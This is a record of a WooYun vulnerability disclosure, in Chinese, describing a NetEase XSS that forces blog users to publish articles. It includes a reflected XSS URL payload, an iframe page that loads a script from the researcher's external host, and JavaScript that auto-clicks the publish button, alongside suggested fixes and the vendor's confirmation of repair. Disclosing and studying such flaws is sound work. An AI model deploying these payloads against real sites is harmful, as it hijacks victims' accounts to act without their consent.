{"id": 74204, "wybug_id": "wooyun-2016-0168244", "wybug_title": "利用网易博客XSS劫持用户发表文章", "wybug_corp": "网易", "wybug_author": "q601333824", "wybug_date": "2016-01-08 10:20", "wybug_open_date": "2016-02-20 15:48", "wybug_type": "XSS 跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向公众公开  简要描述： 写作仁侠却读作人鱼！ 详细说明：       1.这个漏洞利用的是函数 \ncontentWindow\n    2.这个函数可以让父窗口获取子窗口的内容，但是前提是同个域,这里举个例子就是，我可以从网易家居，获取网易博客的内容，如图 \n\n    3.接下来就不用我说了，只要找一个网易家居的XSS,就能直接XSS网易博客了。 \nhttp://home.163.com/photo/?q=%3Cimg/src=%221%22/onerror=%22alert(/1/)%22%3E\n \n\n----------------------------------------------------------------------------------------------     4.知道存在这个问题，但是怎么利用他让用户发帖呢?      5.网易博客很多地方都有这配置,X-Frame-Options \n\n    6.于是我去百度了一下，上面说，这个配置可以防止自己的网页被别的网页嵌套 \n\n-----------------------------------------------------------------------------------------     7.还有一些页面，就算用自己，套自己，都会直接全屏跳转，比如     特别是嵌套:xxxx.blog.163.com/manage.xxxx,整个页面就会被跳转     ①.嵌套：    http://xsstest456.blog.163.com/manage/#m=0&t=4 \n\n     ②.整个页面被跳转到http://xsstest456.blog.163.com/manage/#m=0&t=4\n\n ----------------------------------------------------------------------------------------------------     8.拦都拦不住，根本停不下,所以这些页面不能用contentWindow------------------------------------------------------------------------------------------------------------------------      9.但是一个页面不会跳转，就是转载文章 \n\n \nhttp://blog.163.com/share.do?bid=fks_087068084095089071093087085075072084084068084080080067086082&r=1&host=xsstest456&uid=257066024\n    10.上面参数都是固定的，别担心(因为我浏览器隐身模式换号访问过，没影响)     11.但是这个请求还是跨域的，我不会弄 \n\n----------------------------------------------------------------------------    12.但是你想想看，我们要的发表文章，只要按下发表就行了，内容就是转载的内容不用管，所以只要当前页面执行这段代码就行了,如图 \nvar csol=document.getElementsByClassName(\"m-btn vtag\")[0];csol.click();\n \n\n---------------------------------------------------------------------------------    13.上面废话了那么多，最终利用代码如下    ①。第一段代码为了嵌套反射XSS，为了更隐蔽，因为看到那么长的url谁敢点 \n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /><title>1</title></head><body><iframe src='http://home.163.com/photo/?q=%3Cimg/src=%221/%22onerror=%22var%20t=document.createElement(%27script%27);t.setAttribute(%27src%27%26%2344%3b%27//q601333824.sinaapp.com/1.js%27);document.body.appendChild(t)%22%3E' height=\"3000\" width=\"100%\" security=\"restricted\"></iframe></body></html>\n   ②.上面//q601333824.sinaapp.com/1.js里面内容     为了让iframe加载转载文章页面，然后延迟3000秒，点击发表按钮，别问为什么3秒，因为你总得给iframe时间，让里面的页面加载完，没加载完什么也获取不到 \nvar t=document.createElement(\"iframe\");t.setAttribute(\"src\",\"http://blog.163.com/share.do?bid=fks_087068084095087065093082085071072084084068084080080067086082&r=1&host=xsstest456&uid=257066024\");t.height=\"700\";t.width=\"700\";t.id=\"xss123\";document.body.appendChild(t);function aaa(){       var ccc=document.getElementById(\"xss123\").contentWindow;       var csol=ccc.document.getElementsByClassName(\"m-btn vtag\")[0];        csol.click();}setTimeout(\"aaa()\",3000);\n----------------------------------------------------------------------------------------------       14.下面是测试截图     ①.当用户访问构造好的页面,先加载完，然后直接在XSS自动点击了 \n\n \n\n \n\n      漏洞证明：       1.漏洞证明，看上面     2.下面是测试截图     ①.当用户访问构造好的页面,先加载完，然后直接在XSS自动点击了 \n\n \n\n \n\n   修复方案：         1. 页面加上这段代码试试document.domain=\"blog.163.com\",这样其他页面XSS不会连累博客页面       2.转载页面也可以加上跳转试试       3.最后想说的是，我测试的时候转载了那么多文章，连个验证码都没有碰到        4.测试页面\nhttp://q601333824.sinaapp.com/1ceng.html\n         5.漏洞确认了，页面再删除    版权声明：转载请注明来源 q601333824@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2016-01-08 16:36 厂商回复： 该漏洞已修复。白帽子漏洞利用描述清楚。感谢对网易的支持！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-08 11:46 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1296 漏洞数:131        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  一看就知道是濑户花嫁的铁杆粉    \n     2016-01-08 13:31 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:269 漏洞数:56        | 出自《一拳超人》---世界上，没有一拳解决...)\t\t \n  @子非海绵宝宝 嗯，从第一集到后面基本每集都笑的不行了，全集一共看了两遍    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}